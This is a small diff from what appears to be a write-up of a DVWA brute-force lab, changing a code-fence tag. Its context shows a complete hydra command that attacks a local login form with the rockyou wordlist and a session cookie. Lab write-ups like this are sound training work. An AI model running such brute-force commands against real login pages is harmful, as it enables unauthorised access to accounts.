@@ -53,7 +53,7 @@ Here we are using cookies because if we are not authenticated when we make the l
 
 <details><summary>Click to see output</summary>
 
-```Shell
+```ShellSession
   
 ┌─[aftab@parrot]─[~/Downloads/dvwa]
 └──╼ $hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-get-form "/vulnerabilities/brute/:username=^USER^&password=^PASS^&Login=Login:Username and/or password incorrect.:H=Cookie: security=low; PHPSESSID=rt5o26sooph0v8p5nuarofj346"
